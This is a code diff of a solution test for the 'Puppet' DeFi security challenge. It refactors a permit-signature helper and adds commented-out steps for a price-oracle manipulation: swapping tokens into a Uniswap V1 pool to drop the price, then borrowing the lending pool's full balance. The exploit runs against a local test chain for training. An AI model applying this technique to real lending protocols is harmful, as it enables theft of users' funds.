@@ -4,8 +4,8 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
-const { splitSignature } = require("ethers/lib/utils");
 const { constants } = require("ethers");
+const { getPermitSignature } = require("../helper-methods");
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -109,7 +109,7 @@ describe('[Challenge] Puppet', function () {
             spender: attacker.address,
             value: PLAYER_INITIAL_TOKEN_BALANCE
         });
-
+        
         await attacker.connect(player).attack({
             owner: player.address,
             spender: attacker.address,
@@ -122,6 +122,16 @@ describe('[Challenge] Puppet', function () {
         {
             value: PLAYER_INITIAL_ETH_BALANCE - (10n ** 18n)
         });
+
+        // console.log("Deposit needed for 1 TLV token: ", await lendingPool.calculateDepositRequired(10n ** 18n));
+
+        // await token.connect(player).approve(uniswapExchange.address, await token.balanceOf(player.address));
+        // //const tx = await player.sendTransaction({to: uniswapExchange.address, value: 10n ** 18n, gasLimit: 1e6});
+
+        // await uniswapExchange.connect(player).tokenToEthSwapInput(await token.balanceOf(player.address), 1n, (await ethers.provider.getBlock('latest')).timestamp * 2 );
+        // console.log("Deposit needed for 1 TLV token: ", await lendingPool.calculateDepositRequired(10n ** 18n));
+
+        // await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {value: 20n * 10n ** 18n});
     });
 
     after(async function () {
@@ -138,56 +148,4 @@ describe('[Challenge] Puppet', function () {
             await token.balanceOf(player.address)
         ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE, 'Not enough token balance in player');
     });
-
-    async function getPermitSignature({
-        wallet,
-        token,
-        spender,
-        value
-    }) {
-        const nonce = await token.nonces(wallet.address);
-        const name = await token.name();
-        const version = '1';
-        const chainId = await wallet.getChainId();
-        const deadline = constants.MaxUint256;
-
-
-        return splitSignature(await wallet._signTypedData({
-            name,
-            version,
-            chainId,
-            verifyingContract: token.address,
-        }, {
-            Permit: [
-                {
-                    name: 'owner',
-                    type: 'address',
-                }, 
-                {
-                    name: 'spender',
-                    type: 'address'
-                },
-                {
-                    name: 'value',
-                    type: 'uint256'
-                },
-                {
-                    name: 'nonce',
-                    type: 'uint256'
-                },
-                {
-                    name: 'deadline',
-                    type: 'uint256'
-                }
-            ],
-        },
-        {
-            owner: wallet.address,
-            spender,
-            value,
-            nonce,
-            deadline
-        }
-        ));
-    }
 });
